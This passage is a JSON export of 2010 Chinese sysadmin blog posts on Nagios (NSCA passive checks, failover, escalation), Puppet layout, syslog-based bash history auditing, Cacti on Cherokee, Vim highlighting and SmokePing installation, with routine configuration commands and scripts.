    "content": "<p><strong> </strong>工作中有一些需要我们监控的服务，但是中心服务器的nrpe不能取到远程主机的结果，比如dmesg输出的结果（这个信息有助于提早发现硬件问题）。这就 需要远程主机使用一个构件借助定时任务将强制检测结果送到指定的服务器上去，这就是nsca，。可以夸张地说，只要有了被动检查，什么服务都能监控。<strong><!--more--><img title=\"更多...\" src=\"http://64.120.134.162/wp-includes/js/tinymce/plugins/wordpress/img/trans.gif\" alt=\"\" /></strong></p>\n\n<p><strong> 中文文档里这样介绍：Nsca第一部分是客户端程序(send_nsca)，运行于远程主机上并负责将强制检测结果送到指定的服务器上去，另一部分是 NSCA守护进程(nsca)，它既可以独立地运行于守护服务也可以注册到inetd里作为一个inetd客户程序来提供监听联接。</strong></p>\n\n<p><strong>1 安装NSCA构件</strong></p>\n\n<p>#wget <a href=\"http://nchc.dl.sourceforge.net/sourceforge/nagios/nsca-2.7.2.tar.gz\">http://nchc.dl.sourceforge.net/sourceforge/nagios/nsca-2.7.2.tar.gz</a></p>\n\n<p>#tar zxvf nsca-2.7.2.tar.gz</p>\n\n<p>#cd nsca-2.7.2</p>\n\n<p># ./configure （非默认需要根据nagios用户和组适当指定nsca的用户和组，选项详细信息在帮助里面）&amp;&amp; make all</p>\n\n<p><strong>2 拷贝相关文件至nagios目录下</strong></p>\n\n<p>#cp sample-config/send_nsca.cfg  /opt/nagios/etc/</p>\n\n<p># cp src/send_nsca  /opt/nagios/bin/</p>\n\n<p>注：权限有问题会导致提交不了监控信息</p>\n\n<p><strong>3 修改nsca.cfg相应选项</strong></p>\n\n<p>enable_notifications=0</p>\n\n<p>obsess_over_services=1</p>\n\n<p>我粘贴我的一个被动检查脚本（用于监控一些关键文件的改动，执行脚本使用定时任务）：</p>\n\n<p>[ccine_perl height=\"100%\" width=\"99%\"]#!/bin/bash</p>\n\n<p>NagiosPath=/opt/nagios</p>\n\n<p>if [ -e $NagiosPath ];then</p>\n\n<p>MD5FILE=\"/opt/nagios/libexec/sys_files_md5.conf\"</p>\n\n<p>SendNscaBin=\"opt/nagios/bin/send_nsca\"</p>\n\n<p>SendNscaConf=\"/opt/nagios/etc/send_nsca.cfg\"</p>\n\n<p>else</p>\n\n<p>MD5FILE=\"/usr/local/nagios/libexec/sys_files_md5.conf\"</p>\n\n<p>SendNscaBin=\"/usr/local/nagios/bin/send_nsca\"</p>\n\n<p>SendNscaConf=\"/usr/local/nagios/etc/send_nsca.cfg\"</p>\n\n<p>fi</p>\n\n<p>MD5SUMBIN=\"/usr/bin/md5sum\"</p>\n\n<p>HostName=`hostname`</p>\n\n<p>Result=`$MD5SUMBIN -c $MD5FILE 2&gt;/dev/null | grep FAILED`</p>\n\n<p>if [ \"$Result\" != \"\" ];then</p>\n\n<p>echo -e   \"$HostName\\tcheck_sys_files\\t2\\t$Result\" | $SendNscaBin -H logserver   -c $SendNscaConf</p>\n\n<p>else</p>\n\n<p>echo -e   \"$HostName\\tcheck_sys_files\\t0\\tSystem File is OK.\" | $SendNscaBin   -H logserver -c $SendNscaConf</p>\n\n<p>fi[/ccine_perl]</p>\n",
    "date": {
      "year": "2010",
      "month": "December",
      "day": "05"
    }
  },
  {
    "id": 6,
    "title": "Nagios深入进阶之二:冗余式与失效式网络监控",
    "category": "nagios",
    "tags": [
      "nagios",
      "主从",
      "冗余",
      "失效式"
    ],
    "url": "/archives/nagios%E6%B7%B1%E5%85%A5%E8%BF%9B%E9%98%B6%E4%B9%8B%E4%BA%8C%E5%86%97%E4%BD%99%E5%BC%8F%E4%B8%8E%E5%A4%B1%E6%95%88%E5%BC%8F%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7/",
    "content": "<p>假设我们使用单一的nagios服务器，如果出现一些未知的错误，比如硬件问题，人为因素引起的宕机等，我们在不可知的情况下nagios已 经停止工作了。所以需要做一个“高可用”，也就是所谓的“主从”。原理就是借助定时任务，由\"主\"机把有关故障信息以通知形式送给联系人。当发生问题后 “从”机接过来报警的工作，当“主”机恢复工作，“从”机停止通知功能。当然，“主”和“从”的信息是同步的。<!--more--></p>\n\n<p>以下是脚本（放在从机上）：\n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td width=\"568\" valign=\"top\">[ccine_perl height=\"100%\" width=\"99%\"]#!/bin/sh</td></tr></tbody></table></p>\n\n<p>case   \"$(/home/okooo/apps/nagios/libexec/check_nrpe  –H  logserver –c  check_nagios| awk '{print $2}'|sed   \"s/://\")\" in</p>\n\n<p>CRITICAL)</p>\n\n<p>/opt/nagios/libexec/eventhandlers/enable_notifications</p>\n\n<p>;;</p>\n\n<p>OK)</p>\n\n<p>/opt/nagios/libexec/eventhandlers/disable_notifications</p>\n\n<p>;;</p>\n\n<p>esac</p>\n\n<p>exit 0[/ccine_perl]\n\n\n\n注：其中的enable_notifications和disable_notifications在nagios安装包里面有。</p>\n\n<p>环境配置：</p>\n\n<p>修改“从”机上nagios.cfg</p>\n\n<p><a title=\"表 5.14. 服务检测执行选项\" href=\"http://nagios-cn.sourceforge.net/nagios-cn/configuration.html#execute_service_checks\">execute_service_checks</a> =1  这样从机还能对远程主机进行检测，这样是主从同步</p>\n\n<p><a title=\"表 5.13. 通知选项\" href=\"http://nagios-cn.sourceforge.net/nagios-cn/configuration.html#enable_notifications\">enable_notifications</a> =0 阻止在“主”机正常工作下，\"从\"机对主机与服务送出通知</p>\n\n<p><a title=\"表 5.21. 外部命令检查选项\" href=\"http://nagios-cn.sourceforge.net/nagios-cn/configuration.html#check_external_commands\">check_external_commands</a> =1 决定了Nagios要检查存于<a title=\"表 5.23. 外部命令文件\" href=\"http://nagios-cn.sourceforge.net/nagios-cn/configuration.html#command_file\">命令文件</a>里的将要执行的命令</p>\n",
    "date": {
      "year": "2010",
      "month": "December",
      "day": "06"
    }
  },
  {
    "id": 7,
    "title": "Nagios深入进阶之三：服务扩展的定义",
    "category": "nagios",
    "tags": [
      "nagios",
      "服务定义",
      "服务扩展"
    ],
    "url": "/archives/nagios%E6%B7%B1%E5%85%A5%E8%BF%9B%E9%98%B6%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%9C%8D%E5%8A%A1%E6%89%A9%E5%B1%95%E7%9A%84%E5%AE%9A%E4%B9%89/",
    "content": "<p>本来有四种高级定义：服务扩展的定义，主机扩展的定义，服务依赖的定义，主机依赖的定义，我在这里重点说的是-服务扩展的定义。\n应用环境：假如短信报警通知默认是2个小时，这样太容易造成不及时处理，设置间隔很短，短信又很烦，尤其是短信也发送给领导，那领导更烦。所以就有了这个扩展\n简单的说，我使用它达到了一下效果：<!--more--></p>\n\n<p><strong>第一次发送通知给A</strong></p>\n\n<p><strong>第二次发送给B， 和第一次间隔10分钟</strong></p>\n\n<p><strong>第三次发送给B,C（c是领导，他只想接收一次，并且在解除报警再接收一次解除故障的报警），和第二次间隔20分钟</strong></p>\n\n<p><strong>从第四次开始发送给A        间隔是前一次60分钟</strong></p>\n\n<p>以下是我的配置：[ccine_perl height=\"100%\" width=\"99%\"]</p>\n\n<p>#vi serviceescalation.cfg</p>\n\n<p>define serviceescalation{</p>\n\n<p>host_name                 HOST1</p>\n\n<p>service_description    SOMESERVICE</p>\n\n<p>first_notification        1</p>\n\n<p>last_notification         1</p>\n\n<p>notification_interval   10</p>\n\n<p>contact_groups           A</p>\n\n<p>}</p>\n\n<p>define serviceescalation{</p>\n\n<p>host_name                 HOST1</p>\n\n<p>service_description    SOMESERVICE</p>\n\n<p>first_notification        2</p>\n\n<p>last_notification         2</p>\n\n<p>notification_interval   20</p>\n\n<p>contact_groups           B</p>\n\n<p>}</p>\n\n<p>define serviceescalation{</p>\n\n<p>host_name                  HOST1</p>\n\n<p>service_description     SOMESERVICE</p>\n\n<p>first_notification         3</p>\n\n<p>last_notification          3</p>\n\n<p>notification_interval    20</p>\n\n<p>contact_groups            B,C</p>\n\n<p>}</p>\n\n<p>define serviceescalation{</p>\n\n<p>host_name                 HOST1</p>\n\n<p>service_description    SOMESERVICE</p>\n\n<p>first_notification        4</p>\n\n<p>last_notification         0</p>\n\n<p>notification_interval   60</p>\n\n<p>contact_groups           A</p>\n\n<p>}[/ccine_perl]</p>\n",
    "date": {
      "year": "2010",
      "month": "December",
      "day": "11"
    }
  },
  {
    "id": 8,
    "title": "Nagios深入进阶之四：主从配置的同步",
    "category": "nagios",
    "tags": [
      "主从"
    ],
    "url": "/archives/nagios%E6%B7%B1%E5%85%A5%E8%BF%9B%E9%98%B6%E4%B9%8B%E5%9B%9B%EF%BC%9A%E4%B8%BB%E4%BB%8E%E9%85%8D%E7%BD%AE%E7%9A%84%E5%90%8C%E6%AD%A5/",
    "content": "<p>继实现冗余nagios服务器后，我们要保证nagios配置文件的相同，不能每次都在改动“主”nagios后都也去更改“从”nagios。<!--more-->因为重载/etc/init.d/nagios脚本才能是配置生效，所以我将同步的命令写在了这个脚本里，在reload和restart里引用这个 function（只有能使用这2个参数时候说明配置是正确的，才需要同步信息）\n[ccine_perl height=\"100%\" width=\"99%\"]function sync_conf()\n{\nsed -i 's/master/slave/g' /opt/nagios/etc/objects/commands.cfg\nsed -i 's/M/S/g'  /opt/nagios/bin/ssms.sh\nrsync -azvh  --progress  --exclude-from=/opt/nagios/etc/exclude --delete /opt/nagios/etc/objects/ sys00:/ opt /nagios/etc/objects 2&gt;&amp;1 &gt;/dev/null\nif [ \"$?\" == \"0\" ];then\naction \"sync conf to slave...\"  /bin/true\nfi\nsed -i 's/slave/master/g' /opt/nagios/etc/objects/commands.cfg\nsed -i 's/S/M/g'  /opt/nagios/bin/ssms.sh\n}[/ccine_perl]</p>\n\n<p>注：其中的ssms.sh是我们的短信网关的脚本；</p>\n\n<p>其中master/slave和M/S的sed替换，是因为短信内容变量的设置，同步时需要修改相关内容分辨发送短信的服务器名称；</p>\n\n<p>其中的--exclude-from=/opt/nagios/etc/exclude，是主从nagios配置不同的地方，需要排除防止删除，这个配置文件里面的内容作用是主从nagios服务器对对方状态的报警。</p>\n",
    "date": {
      "year": "2010",
      "month": "December",
      "day": "16"
    }
  },
  {
    "id": 9,
    "title": "puppet配置文件结构树参考",
    "category": "puppet",
    "tags": [
      ".pp",
      "puppet",
      "结构树"
    ],
    "url": "/archives/puppet%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E6%A0%91%E5%8F%82%E8%80%83/",
    "content": "<p>我想大多数人开始学习puppet都会对它的结构化有些迷惑，本文仅供初学puppet，以及希望对puppet更好结构化管理的同学们。很少见的一种思路：</p>\n\n<p><img class=\"alignnone\" title=\"puppet\" src=\"http://farm6.static.flickr.com/5243/5288063660_0a1ecac877.jpg\" alt=\"\" width=\"500\" height=\"479\" /><!--more--></p>\n\n<p><strong>我的整体思路是：</strong></p>\n\n<p><strong>1  所有的配置文件最后都要被主site.pp引用。</strong></p>\n\n<p>主线是：1 class目录下的类.pp=&gt;服务的主配置文件init.pp=&gt;引用模块的mudule.pp</p>\n\n<p>2  node文件夹下服务器分组node节点.pp（例如C.pp）=&gt;node文件夹下site.pp</p>\n\n<p>3  主配置site.pp把1的mudule.pp  和2的node文件夹下site.pp 去“ import”。</p>\n\n<p><strong>2  但是site.pp，不是唯一的，我们可以建无数的site.pp，需要在/etc/puppet/manifests目录下</strong></p>\n\n<p><strong>3   维护方法：</strong></p>\n\n<p>1  增加服务为模块，在/etc/puppet/module目录下新建文件夹。</p>\n\n<p>2  只需要维护此模块下的class下的文件，配置文件全部引用变量，在对应的node里面“ include”类，并且申明变量值。</p>\n\n<p>其中重要文件配置：</p>\n\n<p>vi manifests/node/site.pp ：\n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\">import \"java.pp\"\nimport \"c.pp\"</td>\n</tr>\n</tbody>\n</table>\nvi modules/revfsserver/manifests/init.pp ：\n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\">import \"class/*.pp\"</td>\n</tr>\n</tbody>\n</table>\nvi manifests/node/c.pp\n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\">node 'client.dongwm.com' {\n$group=\"dongwm\"\n$owner=\"dongwm\"\n$tar=\"X.tar.gz\"\n$homedir=\"/opt/newfs/bin\"\n$tardir=\"/opt/src\"\n$path=\"/usr/bin:/usr/sbin:/bin\"\ninclude revfsserver::base\ninclude revfsserver::update\ninclude revfsserver::rollback</td></tr></tbody></table></p>\n\n<p>}\n\n\n\nvi manifests/site.pp\n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td width=\"406\" valign=\"top\">import \"node/site.pp\"</td></tr></tbody></table></p>\n\n<p>import \"node/module.pp \"\n\n\n\nvi manifests/module.pp\n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\">import \"revfsserver\"</td>\n</tr>\n</tbody>\n</table></p>\n",
    "date": {
      "year": "2010",
      "month": "December",
      "day": "18"
    }
  },
  {
    "id": 10,
    "title": "syslog记录history历史记录",
    "category": "其它",
    "tags": [
      "history",
      "syslog"
    ],
    "url": "/archives/syslog%E8%AE%B0%E5%BD%95history%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/",
    "content": "<p>工作中可能会有无聊的黑客在你服务器上转悠，黑客智商都不错，所有离开的时候就会删除history记录。怎么办才能记录下用户的历史记录呢？</p>\n\n<p><strong>原理</strong>：将history记录到syslog上面，并实时的传送到了远端的日志集中服务器上。</p>\n\n<p><strong>方法</strong>：使用bash4.1的新功能：历史命令保存到syslog！然后使用syslog-ng构建集中型日志服务器收集主机日志。<!--more--></p>\n\n<p><strong>1 下载bash：</strong>\n#wget http://ftp.gnu.org/gnu/bash/bash-4.1.tar.gz\n#tar zxvf bash-4.1.tar.gz –C /usr/local/bash-4.1\n#cd /usr/local/bash-4.1\n<strong>2 修改参数(根据个人需要，我只保留了pid，uid，sid等，参数请看目录下的shell.c中)：</strong>\n文件bashhist.c大约708行的位置开始，修改成以下一段：</p>\n\n<p>[ccine_perl height=\"100%\" width=\"99%\"]\nsyslog (SYSLOG_FACILITY|SYSLOG_LEVEL, \"HISTORY: PID=%d PPID=%d SID=%d User=%s CMD=%s\", getpid(), getppid(), getsid(getpid()), current_user.user_name, line);\nelse\n{\nstrncpy (trunc, line, SYSLOG_MAXLEN);\ntrunc[SYSLOG_MAXLEN - 1] = '\\0';\nsyslog (SYSLOG_FACILITY|SYSLOG_LEVEL, \"HISTORY (TRUNCATED): PID=%d PPID=%d SID=%d User=%s CMD=%s\", getpid(), getppid(), getsid(getpid()), current_user.user_name, trunc);\n}[/ccine_perl]\n<span style=\"background-color: #ff0000;\">注</span>：ppid：跟踪sh切换后的用户\nSid： 跟踪 su 切换后的用户\n第二段代表log长度超过600后使用的语句\n<strong>3 去掉config-top.h中define SYSLOG_HISTORY的注释。</strong></p>\n\n<p>结果如下：\n#define SYSLOG_HISTORY\n<strong> 4 编译安装\n</strong> # ./configure &amp; make &amp;&amp; make install\n<strong>5 修改用户配置：\n</strong> 将用户的bash换成现在的bash4.1\n# vi /etc/passwd\ndongwm:x:501:501::/home/dongwm:/usr/local/bash_4.1/bin/bash\n这样日志就会记在/var/log/messages\n结果类似这样：[ccine_perl height=\"100%\" width=\"99%\"]\nDec 23 17:40:28 server -bash: HISTORY: PID=4089 PPID=4088 SID=4089 User=dongwm CMD=exit\nDec 23 17:41:47 server -bash: HISTORY: PID=4282 PPID=4278 SID=4282 User=root CMD=exit\nDec 23 17:41:53 server -bash: HISTORY: PID=4321 PPID=4317 SID=4321 User=root CMD=ssh java00\nDec 23 17:44:09 server -bash: HISTORY: PID=2152 PPID=2137 SID=2152 User=root CMD=vi Clean_javalog.sh\nDec 23 17:45:16 server -bash: HISTORY: PID=2152 PPID=2137 SID=2152 User=root CMD=sh Clean_javalog.sh\nDec 23 17:45:30 server -bash: HISTORY: PID=2152 PPID=2137 SID=2152 User=root CMD=cat /dev/shm/cleanJavaLog.log\nDec 23 17:46:08 server -bash: HISTORY: PID=2152 PPID=2137 SID=2152 User=root CMD=vi Clean_javalog.sh\nDec 23 17:48:54 server -bash: HISTORY: PID=2152 PPID=2137 SID=2152 User=root CMD=cat Clean_javalog.sh </p>\n\n<p>......[/ccine_perl]\n在整个环境布置了记录功能，就能方便的查出来谁-在何时，用什么账号，做了什么操作...\n\n<strong>6 主机syslog配置（添加日志服务器的地址）</strong>\n# vi /etc/syslog.conf</p>\n\n<p>在最后添加一列：\n*.* @server.dongwm.com\n<strong>7 搭建日志服务器\n</strong> 请参看：<span style=\"background-color: #00ff00;\">http://wenku.baidu.com/view/c3bb49c58bd63186bcebbc7a.html</span></p>\n",
    "date": {
      "year": "2010",
      "month": "December",
      "day": "20"
    }
  },
  {
    "id": 11,
    "title": "配置Cherokee下的cacti",
    "category": "cacti",
    "tags": [
      "Cherokee"
    ],
    "url": "/archives/%E9%85%8D%E7%BD%AEcherokee%E4%B8%8B%E7%9A%84cacti/",
    "content": "<p><strong>LCMP</strong><strong>是指</strong><em><strong>Linux.Cherokee.MySQL.PHP/Perl/Python</strong></em><em><strong>。</strong></em><em><strong> </strong></em></p>\n\n<p><em><strong>其中</strong></em><em><strong>Cherokee</strong></em>号称是目前最快的 Web 服务器软件，在性能上，甚至比  Nginx 还略胜一筹。Cherokee 的功能包括支持 FastCGI、SCGI、PHP、CGI、TLS 及 SSL  加密连接，虚拟主机，授权认证，实时编码，载入均衡，与 Apache 兼容的 log 文件等等。Cherokee 内含一个名为  cherokee-admin 的工具，执行后，允许管理员直接通过浏览器进入 http://localhost:9090/ 对其进行管理和配置<!--more--><img title=\"更多...\" src=\"../wp-includes/js/tinymce/plugins/wordpress/img/trans.gif\" alt=\"\" /><strong> </strong></p>\n\n<p><strong>安装</strong><strong>yum-priorities</strong><strong>插件</strong><strong> </strong></p>\n\n<p>#yum install yum-priorities</p>\n\n<p>设置yum在调用软件源时的顺序的。因为官方提供的软件源，都是比较稳定和被推荐使用的。因此，官方源的顺序要高于第三方源的顺序。为保证这个顺序，安装yum-priorities。</p>\n\n<p><strong>配置epel 软件源</strong></p>\n\n<p>#rpm -Uvh <a href=\"http://download.fedora.redhat.com/pub/epel/5/x86_64/epel-release-5-4.noarch.rpm\">http://download.fedora.redhat.com/pub/epel/5/x86_64/epel-release-5-4.noarch.rpm</a></p>\n\n<p><strong>配置ius软件源</strong></p>\n\n<p>注：IUS(<a href=\"http://iuscommunity.org/\">http://iuscommunity.org</a>)是php.net推荐的yum源</p>\n\n<p>#Rpm –Uvh <a href=\"http://dl.iuscommunity.org/pub/ius/stable/Redhat/5/x86_64/ius-release-1.0-6.ius.el5.noarch.rpm\">http://dl.iuscommunity.org/pub/ius/stable/Redhat/5/x86_64/ius-release-1.0-6.ius.el5.noarch.rpm</a></p>\n\n<p><strong>安装 Cherokee</strong></p>\n\n<p>#yum install Cherokee</p>\n\n<p><strong>安装 rrdtool</strong></p>\n\n<p>#yum install rrdtool</p>\n\n<p><strong>安装mysql</strong></p>\n\n<p>#yum install mysql mysql-server</p>\n\n<p><strong>安装PHP, Perl and Python.</strong></p>\n\n<p>注：如果想升级版本，需要卸载之前安装的php</p>\n\n<p>#yum install php53-pear php53 php53-cli php53-common php53-devel  php53-gd php53-mbstring php53-mcrypt php53-mysql php53-pdo php53-soap  php53-xml php53-xmlrpc php53-bcmath php53-pecl-apc php53-pecl-memcache</p>\n\n<p># yum update perl python</p>\n\n<p><strong>设置开机启动：</strong></p>\n\n<p># chkconfig cherokee on\n# chkconfig mysqld on</p>\n\n<p><strong>启动服务：</strong></p>\n\n<p># service mysqld start\n# service cherokee start</p>\n\n<p><strong>到cherokee 管理界面配置虚拟主机：</strong></p>\n\n<p>启动web界面：</p>\n\n<p># cherokee-admin –b\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"2\" width=\"400\">\n<tbody>\n<tr>\n<td width=\"400\" valign=\"top\">Login:\nUser:              admin\nOne-time Password: MdTESIfkMdSmwUj2</td></tr></tbody></table></p>\n\n<p>Web Interface:\nURL:               <a href=\"http://localhost:9090/\">http://localhost:9090/</a></p>\n\n<p>Cherokee Web Server 1.0.6 (Aug  6 2010): Listening on port ALL:9090, TLS\ndisabled, IPv6 enabled, using epoll, 4096 fds system limit, max. 2041\nconnections, caching I/O, single thread\n\n\n\n它会自动生成一个一次性的随机密码。</p>\n\n<p>登陆后的界面：</p>\n\n<p><img title=\"chreokee\" src=\"http://farm6.static.flickr.com/5167/5289412171_325d69b391.jpg\" alt=\"\" width=\"500\" height=\"203\" /></p>\n\n<p>首先启动服务器</p>\n\n<p>选择 右上角的 vservers</p>\n\n<p><img title=\"cherokee\" src=\"http://farm6.static.flickr.com/5046/5290015692_289460c8c5.jpg\" alt=\"\" width=\"360\" height=\"73\" /></p>\n\n<p>添加一个新的虚拟主机。</p>\n\n<p><img title=\"cherokee\" src=\"http://farm6.static.flickr.com/5284/5290015614_646d500b02.jpg\" alt=\"\" width=\"360\" height=\"217\" /></p>\n\n<p>昵称自定，路径为/var/www/cacti</p>\n\n<p>配置好默认已经支持fastCGI：</p>\n\n<p><img title=\"cherokee4\" src=\"http://farm6.static.flickr.com/5283/5289412343_c5a1eebb0f.jpg\" alt=\"\" width=\"500\" height=\"449\" /></p>\n\n<p>然后点击右上角的save  会提示重载。</p>\n\n<p><strong>安装snmp</strong></p>\n\n<p># yum install net-snmp net-snmp-utils</p>\n\n<p><strong>安装cacti</strong></p>\n\n<p># yum install cacti</p>\n\n<p>设置snmp开机启动</p>\n\n<p><strong>启动snmp</strong></p>\n\n<p># chkconfig snmpd on</p>\n\n<p>创建一个cacti的mysql数据库</p>\n\n<p># mysql\nWelcome to the MySQL monitor. Commands end with ; or \\g.\nYour MySQL connection id is 14323\nServer version: 5.0.77 Source distribution\n<blockquote>Type ‘help;’ or ‘\\h’ for help. Type ‘\\c’ to clear the buffer.</blockquote></p>\n\n<p>mysql&gt;create database cacti;\nmysql&gt;GRANT ALL ON cacti.* TO cactiuser@localhost IDENTIFIED BY 'Rubocyz8wM1=';\nmysql&gt;quit\n<strong>导入cacti的mysql数据库架构</strong></p>\n\n<p># mysql -ucactiuser -pcactipassword cacti &lt; /var/www/cacti/cacti.sql</p>\n\n<p><strong>配置cacti，引用刚才在mysql创建的数据</strong></p>\n\n<p># vi /var/www/cacti/include/config.php</p>\n\n<p>$database_type = \"mysql\";\n$database_default = \"cacti\";\n$database_hostname = \"localhost\";\n$database_username = \"cactiuser\";\n$database_password = \"Rubocyz8wM1=\";\n$database_port = \"3306\";</p>\n\n<p>登陆<a href=\"../\">www.dongwm.com</a></p>\n\n<p>出现了cacti的“Cacti Installation Guide”</p>\n\n<p>过程请见其他教程的配置。</p>\n",
    "date": {
      "year": "2010",
      "month": "December",
      "day": "23"
    }
  },
  {
    "id": 12,
    "title": "让puppet代码支持vim高亮显示",
    "category": "puppet",
    "tags": [
      "Syntax Highlight"
    ],
    "url": "/archives/rangpuppetdaimazhichivimgaoliangxianshi/",
    "content": "<p>puppet的<span>语言<em> </em></span>还没有被vim支持，编辑时候黑底白字，不容易排错，看起来也不好分辨，请一定要看我一下这篇高亮显示的文章^.^<!--more--></p>\n\n<p>原理就是在你用户根目录下的.vim里面加2个文件，具体如下：</p>\n\n<p>1 切换到个人vim目录：</p>\n\n<p>#cd ~/.vim</p>\n\n<p>#vi syntax/puppet.vim</p>\n\n<p>添加以下内容：</p>\n\n<p>[ccine_perl height=\"100%\" width=\"99%\"]</p>\n\n<p>\" puppet syntax file\n\" Filename:     puppet.vim\n\" Language:     puppet configuration file\n\" Maintainer:   Dongwm&lt;ciici1234@hotmail.com&gt;\n\" URL:\n\" Last Change:\n\" Version:\n\"</p>\n\n<p>\" Copied from the cfengine, ruby, and perl syntax files\n\" For version 5.x: Clear all syntax items\n\" For version 6.x: Quit when a syntax file was already loaded\nif version &lt; 600\nsyntax clear\nelseif exists(\"b:current_syntax\")\nfinish\nendif</p>\n\n<p>syn region  puppetDefine         start=\"^\\s*\\(class\\|define\\|site\\|node\\)\" end=\"{\"  contains=puppetDefType,puppetDefName,puppetDefArguments\nsyn keyword puppetDefType       class define site node inherits contained\nsyn keyword puppetInherits      inherits contained\nsyn region  puppetDefArguments  start=\"(\" end=\")\" contains=puppetArgument\nsyn match   puppetArgument      \"\\w\\+\" contained\nsyn match   puppetArgument      \"\\$\\w\\+\" contained\nsyn match   puppetArgument      \"'[^']+'\" contained\nsyn match   puppetArgument      '\"[^\"]+\"' contained\nsyn match   puppetDefName     \"\\w\\+\" contained</p>\n\n<p>syn match   puppetInstance           \"\\w\\+\\s*{\" contains=puppetTypeBrace,puppetTypeName,puppetTypeDefault\nsyn match   puppetTypeBrace       \"{\" contained\nsyn match   puppetTypeName       \"[a-z]\\w*\" contained\nsyn match   puppetTypeDefault    \"[A-Z]\\w*\" contained</p>\n\n<p>syn match   puppetParam           \"\\w\\+\\s*=&gt;\" contains=puppetTypeRArrow,puppetParamName\nsyn match   puppetParamRArrow       \"=&gt;\" contained\nsyn match   puppetParamName       \"\\w\\+\" contained\nsyn match   puppetVariable           \"$\\w\\+\"\nsyn match   puppetVariable           \"${\\w\\+}\"\nsyn match   puppetParen           \"(\"\nsyn match   puppetParen           \")\"\nsyn match   puppetBrace           \"{\"\nsyn match   puppetBrace           \"}\"</p>\n\n<p>syn region  puppetString start=+\"+ skip=+\\\\\\\\\\|\\\\\"+ end=+\"+ contains=puppetVariable</p>\n\n<p>syn keyword puppetBoolean    true false\nsyn keyword puppetKeyword    import inherits include\nsyn keyword puppetControl    case default</p>\n\n<p>\" comments last overriding everything else\nsyn match   puppetComment            \"\\s*#.*$\" contains=puppetTodo\nsyn keyword puppetTodo               TODO NOTE FIXME XXX contained</p>\n\n<p>\" Define the default highlighting.\n\" For version 5.7 and earlier: only when not done already\n\" For version 5.8 and later: only when an item doesn't have highlighting yet\nif version &gt;= 508 || !exists(\"did_puppet_syn_inits\")\nif version &lt; 508\nlet did_puppet_syn_inits = 1\ncommand -nargs=+ HiLink hi link &lt;args&gt;\nelse\ncommand -nargs=+ HiLink hi def link &lt;args&gt;\nendif</p>\n\n<p>HiLink puppetVariable             Identifier\nHiLink puppetBoolean              Boolean\nHiLink puppetType                 Identifier\nHiLink puppetDefault              Identifier\nHiLink puppetKeyword              Define\nHiLink puppetTypeDefs             Define\nHiLink puppetComment              Comment\nHiLink puppetString               String\nHiLink puppetTodo                 Todo\n\"  HiLink puppetBrace                Delimiter\n\"  HiLink puppetTypeBrace            Delimiter\n\"  HiLink puppetParen                Delimiter\nHiLink puppetDelimiter            Delimiter\nHiLink puppetControl              Statement\nHiLink puppetDefType              Define\nHiLink puppetDefName              Type\nHiLink puppetTypeName             Statement\nHiLink puppetTypeDefault          Type\nHiLink puppetParamName            Identifier\nHiLink puppetArgument             Identifier</p>\n\n<p>delcommand HiLink\nendif</p>\n\n<p>let b:current_syntax = \"puppet\"</p>\n\n<p>[/ccine_perl]</p>\n\n<p>然后创建目录ftdetect</p>\n\n<p>#mkdir ftdetect</p>\n\n<p>编辑第二个文件：</p>\n\n<p>#vi ftdetect/puppet.vim</p>\n\n<p>[ccine_perl height=\"100%\" width=\"99%\"]au BufRead,BufNewFile *.pp setfiletype puppet[/ccine_perl]</p>\n\n<p>OK!</p>\n\n<p>效果自己体验吧</p>\n",
    "date": {
      "year": "2010",
      "month": "December",
      "day": "25"
    }
  },
  {
    "id": 13,
    "title": "最新方式安装配置smokeping",
    "category": "smokeping",
    "tags": [
      "smokeping"
    ],
    "url": "/archives/zuixinfangshianzhuangpeizhismokeping/",
    "content": "<p>smokeping是对IDC网络质量，稳定性等最好的检测工具，包括常规的 ping，dig，echoping，curl等，可以 监视 www 服务器性能，监视 dns 查询性能，监视 ssh 性能等。选择smokeping我觉得有以下原因：\n<strong>1，最佳的画图功能，延迟和丢包用颜色和阴影表示很直观。\n2，免费和开源，作者是MRTG和RRDtool作者。\n3，支持主从的分布式模式。\n4，可以自定义报警功能。<!--more--></strong>\n前言：\n本文使用YUM安装其他资源包，编译安装smokeping方式。apt.sw.be这个第三方软件仓库，我觉得很不错，更新很快，资源很全。但是这个源很不稳定。\n<strong>1 使用apt.sw.be源（安装前的准备）：</strong>\n#yum update\n#rpm -Uvh http://apt.sw.be/redhat/el5/en/x86_64/rpmforge/RPMS/rpmforge-release-0.5.2-2.el5.rf.x86_64.rpm\n<span style=\"color: #00ff00;\">探讨一个工作中经常出现的yum报错：Metadata file does not match checksum</span>\n可能会出现：http://www.mirrorservice.org/sites/apt.sw.be/redhat/el4/en/i386/dag/repodata/primary.xml.gz（不是本文原来的那个报错路径）:\n[Errno -1] Metadata file does not match checksum 这样的错误，原理是当生成metadata数据的时候，会一同产生校验数据。而传输的时候，会用该校验数据判断metadata是否完整。在这里会下载 other.xml.gz filelists.xml.gz primary.xml.gz,repomd.xml四个文件，其中repomd.xml包含其他三个文件的校检内容，如下是检查效果：\n# sha1sum other.xml.gz filelists.xml.gz primary.xml.gz\n497fbed7cddb2f60265c482331af6ac36b7f2720  other.xml.gz\ne7fb32d7e1e683a57b3391e949cc98d9afec1e50  filelists.xml.gz\n70ba2a3faf75b8db9a15a01efafbc1b36ffbc1a9   primary.xml.gz\n和repomd.xml的内容对比：\n# cat repomd.xml |grep -w 'checksum'|grep -v 'open-checksum'\n&lt;checksum type=\"sha\"&gt;497fbed7cddb2f60265c482331af6ac36b7f2720&lt;/checksum&gt;\n&lt;checksum 